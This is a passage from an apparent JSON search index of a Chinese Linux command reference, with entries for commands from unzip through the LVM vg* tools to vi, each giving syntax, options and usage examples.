b=\"a\"\ndeclare -p b\n# 被引用的变量a被删除\ndeclare -p a\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","unset"]},{"title":"【Linux 命令】unzip","url":"/linux-command/unzip/","content":"\n用于解压缩由zip命令压缩的压缩包\n\n## 补充说明\n\n**unzip命令** 用于解压缩由zip命令压缩的“.zip”压缩包。\n\n### 语法\n\n```shell\nunzip(选项)(参数)\n```\n\n### 选项\n\n```shell\n-c：将解压缩的结果显示到屏幕上，并对字符做适当的转换；\n-f：更新现有的文件；\n-l：显示压缩文件内所包含的文件；\n-p：与-c参数类似，会将解压缩的结果显示到屏幕上，但不会执行任何的转换；\n-t：检查压缩文件是否正确；\n-u：与-f参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中；\n-v：执行时显示详细的信息；\n-z：仅显示压缩文件的备注文字；\n-a：对文本文件进行必要的字符转换；\n-b：不要对文本文件进行字符转换；\n-C：压缩文件中的文件名称区分大小写；\n-j：不处理压缩文件中原有的目录路径；\n-L：将压缩文件中的全部文件名改为小写；\n-M：将输出结果送到more程序处理；\n-n：解压缩时不要覆盖原有的文件；\n-o：不必先询问用户，unzip执行后覆盖原有的文件；\n-P<密码>：使用zip的密码选项；\n-q：执行时不显示任何信息；\n-s：将文件名中的空白字符转换为底线字符；\n-V：保留VMS的文件版本信息；\n-X：解压缩时同时回存文件原来的UID/GID；\n-d<目录>：指定文件解压缩后所要存储的目录；\n-x<文件>：指定不要处理.zip压缩文件中的哪些文件；\n-Z：unzip-Z等于执行zipinfo指令。\n```\n\n### 参数\n\n压缩包：指定要解压的“.zip”压缩包。\n\n### 实例\n\n将压缩文件text.zip在当前目录下解压缩。\n\n```shell\nunzip test.zip\n```\n\n将压缩文件text.zip在指定目录`/tmp`下解压缩，如果已有相同的文件存在，要求unzip命令不覆盖原先的文件。\n\n```shell\nunzip -n test.zip -d /tmp\n```\n\n查看压缩文件目录，但不解压。\n\n```shell\nunzip -v test.zip\n```\n\n将压缩文件test.zip在指定目录`/tmp`下解压缩，如果已有相同的文件存在，要求unzip命令覆盖原先的文件。\n\n```shell\nunzip -o test.zip -d tmp/\n```\n\n解压指定文件，* 用作通配符。\n```shell\nunzip test.zip \"*.jpg\"\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","unzip"]},{"title":"【Linux 命令】updatedb","url":"/linux-command/updatedb/","content":"\n创建或更新slocate命令所必需的数据库文件\n\n## 补充说明\n\n**updatedb命令** 用来创建或更新slocate命令所必需的数据库文件。updatedb命令的执行过程较长，因为在执行时它会遍历整个系统的目录树，并将所有的文件信息写入slocate数据库文件中。\n\n补充说明：slocate本身具有一个数据库，里面存放了系统中文件与目录的相关信息。\n\n###  语法\n\n```shell\nupdatedb(选项)\n```\n\n###  选项\n\n```shell\n-o<文件>：忽略默认的数据库文件，使用指定的slocate数据库文件；\n-U<目录>：更新指定目录的slocate数据库；\n-v：显示执行的详细过程。\n```\n\n###  实例\n\n实用updatedb命令的`-U`选项可以指定要更新slocate数据库的目录。\n\n```shell\nupdatedb -U /usr/local/  更新指定命令的slocate数据库\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","updatedb"]},{"title":"【Linux 命令】uptime","url":"/linux-command/uptime/","content":"\n查看Linux系统负载信息\n\n## 补充说明\n\n**uptime命令** 能够打印系统总共运行了多长时间和系统的平均负载。uptime命令可以显示的信息显示依次为：现在时间、系统已经运行了多长时间、目前有多少登陆用户、系统在过去的1分钟、5分钟和15分钟内的平均负载。\n\n###  语法\n\n```shell\nuptime(选项)\n```\n\n###  选项\n\n```shell\n-V：显示指令的版本信息。\n```\n\n###  实例\n\n使用uptime命令查看系统负载：\n\n```shell\n[root@LinServ-1 ~]# uptime -V    #显示uptime命令版本信息\nprocps version 3.2.7\n\n[root@LinServ-1 ~]# uptime\n 15:31:30 up 127 days,  3:00,  1 user,  load average: 0.00, 0.00, 0.00\n```\n\n **显示内容说明：** \n\n```shell\n15:31:30             # 系统当前时间\nup 127 days,  3:00   # 主机已运行时间,时间越大，说明你的机器越稳定。\n1 user               # 用户连接数，是总连接数而不是用户数\nload average: 0.00, 0.00, 0.00         #  系统平均负载，统计最近1，5，15分钟的系统平均负载\n```\n\n那么什么是系统平均负载呢？ 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。\n\n如果每个CPU内核的当前活动进程数不大于3的话，那么系统的性能是良好的。如果每个CPU内核的任务数大于5，那么这台机器的性能有严重问题。\n\n如果你的linux主机是1个双核CPU的话，当Load Average 为6的时候说明机器已经被充分使用了。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","uptime"]},{"title":"【Linux 命令】useradd","url":"/linux-command/useradd/","content":"\n创建的新的系统用户\n\n## 补充说明\n\n**useradd命令** 用于Linux中创建的新的系统用户。useradd可用来建立用户帐号。帐号建好之后，再用passwd设定帐号的密码．而可用userdel删除帐号。使用useradd指令所建立的帐号，实际上是保存在`/etc/passwd`文本文件中。\n\n在Slackware中，adduser指令是个script程序，利用交谈的方式取得输入的用户帐号资料，然后再交由真正建立帐号的useradd命令建立新用户，如此可方便管理员建立用户帐号。在Red Hat Linux中， **adduser命令** 则是useradd命令的符号连接，两者实际上是同一个指令。\n\n###  语法\n\n```shell\nuseradd(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c<备注>：加上备注文字。备注文字会保存在passwd的备注栏位中；\n-d<登入目录>：指定用户登入时的启始目录；\n-D：变更预设值；\n-e<有效期限>：指定帐号的有效期限；\n-f<缓冲天数>：指定在密码过期后多少天即关闭该帐号；\n-g<群组>：指定用户所属的群组；\n-G<群组>：指定用户所属的附加群组；\n-m：自动建立用户的登入目录；\n-M：不要自动建立用户的登入目录；\n-n：取消建立以用户名称为名的群组；\n-r：建立系统帐号；\n-s<shell>：指定用户登入后所使用的shell；\n-u<uid>：指定用户id。\n```\n\n###  参数\n\n用户名：要创建的用户名。\n\n###  实例\n\n新建用户加入组：\n\n```shell\nuseradd –g sales jack –G company,employees    //-g：加入主要组、-G：加入次要组\n```\n\n建立一个新用户账户，并设置ID：\n\n```shell\nuseradd caojh -u 544\n```\n\n需要说明的是，设定ID值时尽量要大于500，以免冲突。因为Linux安装后会建立一些特殊用户，一般0到499之间的值留给bin、mail这样的系统账号。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","useradd"]},{"title":"【Linux 命令】userdel","url":"/linux-command/userdel/","content":"\n用于删除给定的用户以及与用户相关的文件\n\n## 补充说明\n\n**userdel命令** 用于删除给定的用户，以及与用户相关的文件。若不加选项，则仅删除用户帐号，而不删除相关文件。\n\n###  语法\n\n```shell\nuserdel(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：强制删除用户，即使用户当前已登录；\n-r：删除用户的同时，删除与用户相关的所有文件。\n```\n\n###  参数\n\n用户名：要删除的用户名。\n\n###  实例\n\nuserdel命令很简单，比如我们现在有个用户linuxde，其家目录位于`/var`目录中，现在我们来删除这个用户：\n\n```shell\nuserdel linuxde       # 删除用户linuxde，但不删除其家目录及文件；\nuserdel -r linuxde    # 删除用户linuxde，其家目录及文件一并删除；\n```\n\n请不要轻易用`-r`选项；他会删除用户的同时删除用户所有的文件和目录，切记如果用户目录下有重要的文件，在删除前请备份。\n\n其实也有最简单的办法，但这种办法有点不安全，也就是直接在`/etc/passwd`中删除您想要删除用户的记录；但最好不要这样做，`/etc/passwd`是极为重要的文件，可能您一不小心会操作失误。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","userdel"]},{"title":"【Linux 命令】usermod","url":"/linux-command/usermod/","content":"\n用于修改用户的基本信息\n\n## 补充说明\n\n**usermod命令** 用于修改用户的基本信息。usermod 命令不允许你改变正在线上的使用者帐号名称。当 usermod 命令用来改变user id，必须确认这名user没在电脑上执行任何程序。你需手动更改使用者的 crontab 档。也需手动更改使用者的 at 工作档。采用 NIS server 须在server上更动相关的NIS设定。\n\n### 语法\n\n```shell\nusermod(选项)(参数)\n```\n\n### 选项\n\n```shell\n-c<备注>：修改用户帐号的备注文字；\n-d<登入目录>：修改用户登入时的目录，只是修改/etc/passwd中用户的家目录配置信息，不会自动创建新的家目录，通常和-m一起使用；\n-m<移动用户家目录>:移动用户家目录到新的位置，不能单独使用，一般与-d一起使用。\n-e<有效期限>：修改帐号的有效期限；\n-f<缓冲天数>：修改在密码过期后多少天即关闭该帐号；\n-g<群组>：修改用户所属的群组；\n-G<群组>；修改用户所属的附加群组；\n-l<帐号名称>：修改用户帐号名称；\n-L：锁定用户密码，使密码无效；\n-s<shell>：修改用户登入后所使用的shell；\n-u<uid>：修改用户ID；\n-U:解除密码锁定。\n```\n\n### 参数\n\n登录名：指定要修改信息的用户登录名。\n\n### 实例\n\n将 newuser2 添加到组 staff 中：\n\n```shell\nusermod -G staff newuser2\n```\n\n修改newuser的用户名为newuser1：\n\n```shell\nusermod -l newuser1 newuser\n```\n\n锁定账号newuser1：\n\n```shell\nusermod -L newuser1\n```\n\n解除对newuser1的锁定：\n\n```shell\nusermod -U newuser1\n```\n\n增加用户到用户组中:\n\n```shell\napk add shadow # 安装 shadow 包, usermod 命令包含在 usermod 中\nusermod -aG group user # 添加用户到用户组中\n```\n\n`-a` 参数表示附加，只和 `-G` 参数一同使用，表示将用户增加到组中。\n\n修改用户家目录：\n```\n[root@node-1 ~]# useradd lutixiaya\n[root@node-1 ~]# ls /home\nlutixiaya\n[root@node-1 ~]# usermod -md /data/new_home lutixiaya\n[root@node-1 ~]# ls /home/\n[root@node-1 ~]# ls /data/\nnew_home\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","usermod"]},{"title":"【Linux 命令】usernetctl","url":"/linux-command/usernetctl/","content":"\n被允许时操作指定的网络接口\n\n## 补充说明\n\n**usernetctl命令** 在用于被允许时操作指定的网络接口。\n\n###  语法\n\n```shell\nusernetctl(参数)\n```\n\n###  参数\n\n*   网络接口：被操纵的网络接口；\n*   up：激活网络接口；\n*   down：禁用网络接口；\n*   report：报告网络接口状态。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","usernetctl"]},{"title":"【Linux 命令】users","url":"/linux-command/users/","content":"\n打印当前主机所有登陆用户的名称。\n\n## 概要\n\n```shell\nusers [OPTION]... [FILE]\n```\n\n## 主要用途\n\n- 每个显示的用户名对应一个登录会话；如果一个用户有不止一个登录会话，那他的用户名将显示相同的次数。\n\n## 选项\n\n```shell\n--help       显示帮助信息并退出。\n--version    显示版本信息并退出。\n```\n\n## 参数\n\nFILE（可选）：记录用户当前登录情况的文件；默认使用 `/var/run/utmp` 、`/var/log/wtmp`。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\n[root@localhost ~]# users\nroot root\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 users`，`info coreutils 'users invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","users"]},{"title":"【Linux 命令】uucico","url":"/linux-command/uucico/","content":"\nUUCP文件传输服务程序\n\n## 补充说明\n\n**uucico命令** 命令UUCP文件传输服务程序。 uucico是用来处理uucp或uux送到队列的文件传输工具。uucico有两种工作模式：主动模式和附属模式。当在主动模式下时，uucico会调用远端主机；在附属模式下时，uucico则接受远端主机的调用。\n\n###  语法\n\n```shell\nuucico [-cCDefqvwz][-i<类型>][-I<文件>][-p<连接端口号码>][-][-rl][-s<主机>][-S<主机>][-u<用户>][-x<类型>][--help]\n```\n\n###  选项\n\n```shell\n-c或--quiet 当不执行任何工作时，不要更改记录文件的内容及更新目前的状态。\n-C或--ifwork 当有工作要执行时，才调用-s或-S参数所指定主机。\n-D或--nodetach 不要与控制终端机离线。\n-e或--loop 在附属模式下执行，并且出现要求登入的提示画面。\n-f或--force 当执行错误时，不等待任何时间即重新调用主机。\n-i<类型>或--stdin<类型> 当使用到标准输入设备时，指定连接端口的类型。\n-I<文件>--config<文件> 指定使用的配置文件。\n-l或--prompt 出现要求登入的提示画面。\n-p<连接端口号码>或-port<连接端口号码> 指定连接端口号码。\n-q或--quiet 不要启动uuxqt服务程序。\n-r0或--slave 以附属模式启动。\n-s<主机>或--system<主机> 调用指定的主机。\n-u<用户>或--login<用户> 指定登入的用户帐号，而不允许输入任意的登入帐号。\n-v或--version 显示版本信息，并且结束程序。\n-w或--wait 在主动模式下，当执行调用动作时，则出现要求登入的提示画面。\n-x<类型>或-X<类型>或outgoing-debug<类型> 启动指定的排错模式。\n-z或--try-next 当执行不成功时，尝试下一个选择而不结束程序。\n--help 显示帮助，并且结束程序。\n```\n\n### 实例\n\n使用主动模式启动uucico服务。在命令提示符下直接输入如下命令：\n\n```shell\nuucico-r1\n```\n\n提示：该命令一般没有输出。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","uucico"]},{"title":"【Linux 命令】uupick","url":"/linux-command/uupick/","content":"\n命令处理传送进来的文件\n\n## 补充说明\n\n**uupick命令** 处理传送进来的文件。 当其他主机通过UUCP将文件传送进来时，可利用uupick指令取出这些文件。\n\n###  语法\n\n```shell\nuupick [-v][-I<配置文件>][-s<主机>][-x<层级>][--help]\n```\n\n###  选项\n\n```shell\n-I<配置文件>或--config<配置文件> 指定配置文件。\n-s<主机>或--system<主机> 处理由指定主机传送过来的文件。\n-v或--version 显示版本信息。\n--help 显示帮助。\n```\n\n### 例子\n\n处理由主机localhost传送过来的文件。在命令行直接输入如下命令：\n\n```shell\nuupick-s localhost\n```\n\n该命令通常没有输出。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","uupick"]},{"title":"【Linux 命令】uuto","url":"/linux-command/uuto/","content":"\n将文件传送到远端的UUCP主机\n\n## 补充说明\n\n**uuto命令** 为script文件，它实际上会执行uucp，用来将文件传送到远端UUCP主机，并在完成工作后，以邮件通知远端主机上的用户。\n\n###  语法\n\n```shell\nuuto [文件][目的]\n```\n\n\n### 例子\n\n将文件传送到远程 UUCP 主机 localhost 的 tmp 目录，在命令提示符中直接输入如下命令：\n\n```shell\nuuto./testfile localhost/tmp # 将文件传送到远程UUCP 主机localhost的tmp目录 \n```\n\n该命令通常没有输出。\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","uuto"]},{"title":"【Linux 命令】vdfuse","url":"/linux-command/vdfuse/","content":"\nVirtualBox软件挂载VDI分区文件工具\n\n## 补充说明\n\n**vdfuse命令** 是VirtualBox软件挂载VDI分区文件的一个工具，VirtualBox是一款能创建虚拟机的开源软件，vdi是它的默认磁盘格式。\n\n###  什么是VirtualBox\n\nVirtualBox是一款功能强大的x86虚拟机软件，它不仅具有丰富的特色，而且性能也很优异。更可喜的是，VirtualBox于数日前走向开源，成为了一个发布在GPL许可之下的自由软件。VirtualBox可以在Linux和Windows主机中运行，并支持在其中安装Windows (NT 4.0、2000、XP、Server 2003、Vista)、DOS/Windows 3.x、Linux (2.4 和 2.6)、OpenBSD等系列的客户操作系统。\n\n **在Ubuntu中安装vdfuse，打开终端，输入：** \n\n```shell\nsudo apt-get install virtualbox-fuse\n```\n\n###  语法\n\n```shell\nvdfuse [options] -f image-file mountpoint\n```\n\n###  选项\n\n```shell\n-h 帮助\n-r 只读\n-t 类型 (VDI, VMDK, VHD, or raw; default: auto)\n-f 镜像文件\n-a 允许所有用户读取\n-w 允许所有用户都写\n-g 前台运行\n-v 输出反馈\n-d debug模式\n```\n\n注意：必须编辑一下`/etc/fuse.confand`，去掉 \"user_allow_other\" 前面的注释符号（#），否则不能正确运行。\n\n###  实例\n\n使用如下如下语句挂载.vdi文件：\n\n```shell\nsudo vdfuse -f /path/to/file.vdi /path/to/mountpoint\n```\n\n`/path/to/mountpoint`应该包含如下文件EntireDisk、Partition1等，如果只有一个文件，你可能需要这样挂载：\n\n```shell\nmount /path/to/mountpoint/Partition1 /path/to/someother/mountpoint\n```\n\n文件系统就挂载到`/path/to/someother/mountpoint`了。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vdfuse"]},{"title":"【Linux 命令】vgchange","url":"/linux-command/vgchange/","content":"\n修改卷组属性\n\n## 补充说明\n\n**vgchange命令** 用于修改卷组的属性，经常被用来设置卷组是处于活动状态或非活动状态。处于活动状态的卷组无法被删除，必须使用vgchange命令将卷组设置为非活动状态后才能删除。\n\n###  语法\n\n```shell\nvgchange(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：设置卷组的活动状态。\n```\n\n###  参数\n\n卷组：指定要设置属性的卷组。\n\n###  实例\n\n使用vgchange命令将卷组状态改为活动的。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# vgchange -ay vg1000     #将卷组\"vg1000\"设置为活动状态\n```\n\n输出信息如下：\n\n```shell\n1 logical volume(s) in volume group \"vg1000\" now active\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgchange"]},{"title":"【Linux 命令】vgconvert","url":"/linux-command/vgconvert/","content":"\n转换卷组元数据格式\n\n## 补充说明\n\n**vgconvert命令** 用于转换指定LVM卷组的元数据格式，通常将“LVM1”格式的卷组转换为“LVM2”格式。转换卷组元数据前必须保证卷组处于非活动状态，否则无法完成转换操作。\n\n###  语法\n\n```shell\nvgconvert(选项)(参数)\n```\n\n###  选项\n\n```shell\n-M：要转换的卷组格式。\n```\n\n###  参数\n\n卷组：指定要转换格式的卷组。\n\n###  实例\n\n转换卷组元数据格式前，使用vgchange命令将卷组设置为非活动状态。在命令行中输入下面的命令：\n\n```shell\n[root@localhost lvm]# vgchange -an vg1000    #设置卷组状态为非活动状态\n0 logical volume(s) in volume group \"vg1000\" now active \n\n```shell\n\n使用vgconvert命令将卷组\"vg1000\"从\"LVM1\"格式转换为\"LVM2\"格式。在命令行中输入下面的命令：\n\n```shell\n[root@localhost lvm]# vgconvert -M2 vg1000    #转换卷组为\"LVM2\"格式\nVolume group vg1000 successfully converted\n```\n\n使用vgchange命令将卷组设置为活动状态。在命令行中输入下面的命令：\n\n```shell\n[root@localhost lvm]# vgchange -ay vg1000     #设置卷组状态为活动状态\n0 logical volume(s) in volume group \"vg1000\" now active\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgconvert"]},{"title":"【Linux 命令】vgcreate","url":"/linux-command/vgcreate/","content":"\n用于创建LVM卷组\n\n## 补充说明\n\n**vgcreate命令** 用于创建LVM卷组。卷组（Volume Group）将多个物理卷组织成一个整体，屏蔽了底层物理卷细节。在卷组上创建逻辑卷时不用考虑具体的物理卷信息。\n\n###  语法\n\n```shell\nvgcreate(选项)(参数)\n```\n\n###  选项\n\n```shell\n-l：卷组上允许创建的最大逻辑卷数；\n-p：卷组中允许添加的最大物理卷数；\n-s：卷组上的物理卷的PE大小。\n```\n\n###  参数\n\n*   卷组名：要创建的卷组名称；\n*   物理卷列表：要加入到卷组中的物理卷列表。\n\n###  实例\n\n使用vgcreate命令创建卷组 \"vg1000\"，并且将物理卷`/dev/sdb1`和`/dev/sdb2`添加到卷组中。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# vgcreate vg1000 /dev/sdb1 /dev/sdb2  #创建卷组\"vg1000\"\n```\n\n输出信息如下：\n\n```shell\nVolume group \"vg1000\" successfully created\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgcreate"]},{"title":"【Linux 命令】vgdisplay","url":"/linux-command/vgdisplay/","content":"\n显示LVM卷组的信息\n\n## 补充说明\n\n**vgdisplay命令** 用于显示LVM卷组的信息。如果不指定\"卷组\"参数，则分别显示所有卷组的属性。\n\n###  语法\n\n```shell\nvgdisplay(选项)(参数)\n```\n\n###  选项\n\n```shell\n-A：仅显示活动卷组的属性；\n-s：使用短格式输出的信息。\n```\n\n###  参数\n\n卷组：要显示属性的卷组名称。\n\n###  实例\n\n使用vgdisplay命令显示存在的卷组\"vg1000\"的属性。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# vgdisplay vg1000     #显示卷组\"vg1000\"的属性\n```\n\n输出信息如下：\n\n```shell\n  --- Volume group ---  \n  VG Name               vg1000  \n......省略部分输出内容......  \n  free  PE / Size       50 / 200.00 MB  \n  VG UUID  ICprwg-ZmhA-JKYF-WYuy-jNHa-AyCN-ZS5F7B\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgdisplay"]},{"title":"【Linux 命令】vgextend","url":"/linux-command/vgextend/","content":"\n向卷组中添加物理卷\n\n## 补充说明\n\n**vgextend命令** 用于动态扩展LVM卷组，它通过向卷组中添加物理卷来增加卷组的容量。LVM卷组中的物理卷可以在使用vgcreate命令创建卷组时添加，也可以使用vgextend命令动态的添加。\n\n###  语法\n\n```shell\nvgextend(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：调试模式；\n-t：仅测试。\n```\n\n###  参数\n\n*   卷组：指定要操作的卷组名称；\n*   物理卷列表：指定要添加到卷组中的物理卷列表。\n\n###  实例\n\n使用vgextend命令向卷组\"vg2000\"中添加物理卷。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# vgextend vg2000 /dev/sdb2     #将物理卷\"/dev/sdb2\"加入卷组\"vg2000\"\n```\n\n输出信息如下：\n\n```shell\nVolume group \"vg2000\" successfully extended\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgextend"]},{"title":"【Linux 命令】vgreduce","url":"/linux-command/vgreduce/","content":"\n从卷组中删除物理卷\n\n## 补充说明\n\n**vgreduce命令** 通过删除LVM卷组中的物理卷来减少卷组容量。不能删除LVM卷组中剩余的最后一个物理卷。\n\n### 语法\n\n```shell\nvgreduce(选项)(参数)\n```\n\n### 选项\n\n```shell\n-a：如果命令行中没有指定要删除的物理卷，则删除所有的空物理卷；\n--removemissing：删除卷组中丢失的物理卷，使卷组恢复正常状态。\n```\n\n### 参数\n\n*   卷组：指定要操作的卷组名称；\n*   物理卷列表：指定要删除的物理卷列表。\n\n### 实例\n\n使用vgreduce命令从卷组\"vg2000\"中移除物理卷`/dev/sdb2`。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# vgreduce vg2000 /dev/sdb2    #将物理卷\"/dev/sdb2\"从卷组\"vg2000\"中删除\n```\n\n输出信息如下：\n\n```shell\nRemoved \"/dev/sdb2\" from volume group \"vg2000\"\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgreduce"]},{"title":"【Linux 命令】vgremove","url":"/linux-command/vgremove/","content":"\n用于用户删除LVM卷组\n\n## 补充说明\n\n**vgremove命令** 用于用户删除LVM卷组。当要删除的卷组上已经创建了逻辑卷时，vgremove命令需要进行确认删除，防止误删除数据。\n\n###  语法\n\n```shell\nvgremove(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：强制删除。\n```\n\n###  参数\n\n卷组：指定要删除的卷组名称。\n\n###  实例\n\n使用vgremove命令删除LVM卷组\"vg1000\"。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# vgremove vg1000    #删除卷组\"vg1000\"\nVolume group \"vg1000\" successfully removed\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgremove"]},{"title":"【Linux 命令】vgrename","url":"/linux-command/vgrename/","content":"\n使用vgrename命令可以重命名卷组的名称\n\n## 补充说明\n\n**grename命令** 可以重命名卷组的名称。\n\n### 语法\n\n```shell\nvgrename [选项] [旧卷组路径|旧卷组名称|旧卷组UUID] [新卷组路径|新卷组名称]\n```\n\n### 选项\n\n```shell\n-d 启用调试模式\n-t 启用测试模式\n```\n\n### 例子\n\n重命名卷组/dev/vg1为/dev/vg2。\n\n```shell\n[root@localhost ~]# vgrename /dev/vg1 /dev/vg2\n  Volume group \"vg1\" successfullyrenamed to \"vg2\"\n```\n\n重命名卷组vg1为vg2。\n\n```shell\n[root@localhost ~]# vgrename vg1 vg2\n  Volume group \"vg1\" successfully renamed to \"vg2\"\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgrename"]},{"title":"【Linux 命令】vgscan","url":"/linux-command/vgscan/","content":"\n扫描并显示系统中的卷组\n\n## 补充说明\n\n**vgscan命令** 查找系统中存在的LVM卷组，并显示找到的卷组列表。vgscan命令仅显示找到的卷组的名称和LVM元数据类型，要得到卷组的详细信息需要使用vgdisplay命令。\n\n### 语法\n\n```shell\nvgscan(选项)\n```\n\n### 选项\n\n```shell\n-d：调试模式；\n--ignorerlockingfailure：忽略锁定失败的错误。\n```\n\n### 实例\n\n使用vgscan命令扫描系统中所有的卷组。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# vgscan     #扫描并显示LVM卷组列表\n```\n\n输出信息如下：\n\n```shell\nFound volume group \"vg2000\" using metadata type lvm2  \nFound volume group \"vg1000\" using metadata type lvm2 \n```\n\n说明：本例中，vgscan指令找到了两个LVM2卷组\"vg1000\"和\"vg2000\"。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vgscan"]},{"title":"【Linux 命令】vi","url":"/linux-command/vi/","content":"\n功能强大的纯文本编辑器\n\n## 补充说明\n\n**vi命令** 是UNIX操作系统和类UNIX操作系统中最通用的全屏幕纯文本编辑器。Linux中的vi编辑器叫vim，它是vi的增强版（vi Improved），与vi编辑器完全兼容，而且实现了很多增强功能。\n\nvi编辑器支持编辑模式和命令模式，编辑模式下可以完成文本的编辑功能，命令模式下可以完成对文件的操作命令，要正确使用vi编辑器就必须熟练掌握着两种模式的切换。默认情况下，打开vi编辑器后自动进入命令模式。从编辑模式切换到命令模式使用“esc”键，从命令模式切换到编辑模式使用“A”、“a”、“O”、“o”、“I”、“i”键。\n\nvi编辑器提供了丰富的内置命令，有些内置命令使用键盘组合键即可完成，有些内置命令则需要以冒号“：”开头输入。常用内置命令如下：\n\n```shell\nCtrl+u：向文件首翻半屏；\nCtrl+d：向文件尾翻半屏；\nCtrl+f：向文件尾翻一屏；\nCtrl+b：向文件首翻一屏；\nEsc：从编辑模式切换到命令模式；\nZZ：命令模式下保存当前文件所做的修改后退出vi；\n:行号：光标跳转到指定行的行首；\n:$：光标跳转到最后一行的行首；\nx或X：删除一个字符，x删除光标后的，而X删除光标前的；\nD：删除从当前光标到光标所在行尾的全部字符；\ndd：删除光标行正行内容；\nndd：删除当前行及其后n-1行；\nnyy：将当前行及其下n行的内容保存到寄存器？中，其中？为一个字母，n为一个数字；\np：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的下方；\nP：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的上方；\n/字符串：文本查找操作，用于从当前光标所在位置开始向文件尾部查找指定字符串的内容，查找的字符串会被加亮显示；\n？字符串：文本查找操作，用于从当前光标所在位置开始向文件头部查找指定字符串的内容，查找的字符串会被加亮显示；\na，bs/F/T：替换文本操作，用于在第a行到第b行之间，将F字符串换成T字符串。其中，“s/”表示进行替换操作；\na：在当前字符后添加文本；\nA：在行末添加文本；\ni：在当前字符前插入文本；\nI：在行首插入文本；\no：在当前行后面插入一空行；\nO：在当前行前面插入一空行；\n:wq：在命令模式下，执行存盘退出操作；\n:w：在命令模式下，执行存盘操作；\n:w！：在命令模式下，执行强制存盘操作；\n:q：在命令模式下，执行退出vi操作；\n:q！：在命令模式下，执行强制退出vi操作；\n:e文件名：在命令模式下，打开并编辑指定名称的文件；\n:n：在命令模式下，如果同时打开多个文件，则继续编辑下一个文件；\n:f：在命令模式下，用于显示当前的文件名、光标所在行的行号以及显示比例；\n:set number：在命令模式下，用于在最左端显示行号；\n:set nonumber：在命令模式下，用于在最左端不显示行号；\n```\n\n###  语法\n\n```shell\nvi(选项)(参数)\n```\n\n###  选项\n\n```shell\n+<行号>：从指定行号的行开始显示文本内容；\n-b：以二进制模式打开文件，用于编辑二进制文件和可执行文件；\n-c<指令>：在完成对第一个文件编辑任务后，执行给出的指令；\n-d：以diff模式打开文件，当多个文件编辑时，显示文件差异部分；\n-l：使用lisp模式，打开“lisp”和“showmatch”；\n-m：取消写文件功能，重设“write”选项；\n-M：关闭修改功能；\n-n：不实用缓存功能；\n-o<文件数目>：指定同时打开指定数目的文件；\n-R：以只读方式打开文件；\n-s：安静模式，不现实指令的任何错误信息。\n```\n\n###  参数\n\n文件列表：指定要编辑的文件列表。多个文件之间使用空格分隔开。\n\n## 知识扩展  \n\nvi编辑器有三种工作方式：命令方式、输入方式和ex转义方式。通过相应的命令或操作，在这三种工作方式之间可以进行转换。\n\n**命令方式** \n\n在Shell提示符后输入命令vi，进入vi编辑器，并处于vi的命令方式。此时，从键盘上输入的任何字符都被作为编辑命令来解释，例如，a(append）表示附加命令，i(insert）表示插入命令，x表示删除字符命令等。如果输入的字符不是vi的合法命令，则机器发出“报警声”，光标不移动。另外，在命令方式下输入的字符（即vi命令）并不在屏幕上显示出来，例如，输入i，屏幕上并无变化，但通过执行i命令，编辑器的工作方式却发生变化：由命令方式变为输入方式。\n\n**输入方式** 